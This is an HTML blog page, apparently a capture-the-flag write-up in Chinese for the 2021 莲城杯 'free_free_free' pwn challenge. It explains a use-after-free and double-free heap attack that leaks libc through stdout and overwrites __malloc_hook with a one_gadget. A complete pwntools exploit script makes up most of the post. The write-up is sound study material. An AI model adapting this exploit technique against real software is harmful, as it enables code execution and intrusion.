@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="WP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="free_free_free分析 UAF,存在UAF，释放进入fastbin链表，之后修改fd指针的最低字节可以申请到fake chunk  题目中只有两个操作create, delete，其中delete没有把指针数组清空，存在uaf，同时没有限制堆块个数。 没有show函数首先就是想到打stdout来泄露libc地址，之后就可以uaf修改mallochook了，所以这题的关键是如何泄露。 很容">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021莲城杯free_free_free">
+<meta property="og:url" content="http://example.com/2021/10/19/2021%E8%8E%B2%E5%9F%8E%E6%9D%AFfree-free-free/index.html">
+<meta property="og:site_name" content="Tm0tfl">
+<meta property="og:description" content="free_free_free分析 UAF,存在UAF，释放进入fastbin链表，之后修改fd指针的最低字节可以申请到fake chunk  题目中只有两个操作create, delete，其中delete没有把指针数组清空，存在uaf，同时没有限制堆块个数。 没有show函数首先就是想到打stdout来泄露libc地址，之后就可以uaf修改mallochook了，所以这题的关键是如何泄露。 很容">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211014145847790.png">
+<meta property="article:published_time" content="2021-10-18T16:01:50.000Z">
+<meta property="article:modified_time" content="2021-10-18T16:05:55.547Z">
+<meta property="article:author" content="Tm0tfl">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211014145847790.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/10/19/2021莲城杯free-free-free/"/>
+
+
+
+
+
+  <title>2021莲城杯free_free_free | Tm0tfl</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tm0tfl</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/19/2021%E8%8E%B2%E5%9F%8E%E6%9D%AFfree-free-free/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://qvb75z5z6.hn-bkt.clouddn.com/1605841888100229.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tm0tfl">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2021莲城杯free_free_free</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-10-19T00:01:50+08:00">
+                2021-10-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WP/" itemprop="url" rel="index">
+                    <span itemprop="name">WP</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="free-free-free"><a href="#free-free-free" class="headerlink" title="free_free_free"></a>free_free_free</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><blockquote>
+<p>UAF,存在UAF，释放进入fastbin链表，之后修改fd指针的最低字节可以申请到fake chunk</p>
+</blockquote>
+<p>题目中只有两个操作<code>create, delete</code>，其中<code>delete</code>没有把指针数组清空，存在<code>uaf</code>，同时没有限制堆块个数。</p>
+<p>没有<code>show</code>函数首先就是想到打<code>stdout</code>来泄露<code>libc</code>地址，之后就可以<code>uaf</code>修改<code>mallochook</code>了，所以这题的关键是如何泄露。</p>
+<p>很容易想到利用<code>unsorted bin</code>残留的<code>main_arena +88</code>可以爆破半个字节来定位到<code>_IO_stdout_2_1 -0x43</code>的位置，来获的一个伪造的<code>0x7f</code>大小的<code>chunk</code>。</p>
+<p>我是先在一个<code>chunk1</code>中伪造一个<code>fake chunk1</code>，然后通过<code>double free</code>，来修改<code>fd</code>指针的最低字节就可以把<code>fake chunk1</code>链接进<code>fastbin</code>，取出之后再通过修改<code>chunk1</code>的内容修改<code>size</code>位，释放之后就可以进入<code>unsorted bin</code>。</p>
+<p>我们可以通过精心构造，让这个<code>fake chunk</code>包含<code>chunk1</code>的后半部分和<code>chunk2</code>的全部，这时候可以通过申请一个堆块，让<code>chunk2+0x20</code>的位置写入<code>main_arena</code>的地址，在<code>chunk2+0x10</code>处伪造<code>fake chunk2</code>，同时修改<code>fake chunk2-&gt;fd</code>为<code>_IO_stdout_2_1-0x43</code>，通过<code>double free</code>链接进<code>fastbin</code>。要注意堆块的大小。</p>
+<p><img src="http://tmotfl-image.oss-cn-beijing.aliyuncs.com/img/image-20211014145847790.png" alt="image-20211014145847790"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span> </span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span> </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./free_free_free&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#0 A</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment">#1 B</span></span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;\xb0&#x27;</span>) <span class="comment">#4 A</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#5 B</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#6 A</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#7 fake chunk</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)) <span class="comment">#8 </span></span><br><span class="line"><span class="comment"># # delete(7) #unsorted bin  malloc(0x20)</span></span><br><span class="line">create(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#9</span></span><br><span class="line">create(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#10</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">create(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x50</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + <span class="string">&#x27;\xdd\x25&#x27;</span>) <span class="comment">#12</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;\xf0&#x27;</span>) <span class="comment">#13</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#14</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#15</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment">#16</span></span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x43</span>-<span class="number">0x10</span>) + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># debug() #0x3c56a3</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c56a3</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libcbase)))</span><br><span class="line"></span><br><span class="line">mallochook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">og = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1247</span>]</span><br><span class="line">onegadget = libcbase + og[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x60</span>, p64(mallochook-<span class="number">0x23</span>))</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(onegadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;10&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/WP/" rel="tag"># WP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/10/06/DASCTF%E4%B9%9D%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/" rel="next" title="DASCTF九月挑战赛">
+                <i class="fa fa-chevron-left"></i> DASCTF九月挑战赛
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/10/19/2021%E9%B9%A4%E5%A3%81%E6%9D%AF/" rel="prev" title="2021鹤壁杯">
+                2021鹤壁杯 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://qvb75z5z6.hn-bkt.clouddn.com/1605841888100229.jpeg"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xxy1126" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1335926819@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#free-free-free"><span class="nav-number">1.</span> <span class="nav-text">free_free_free</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tm0tfl</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
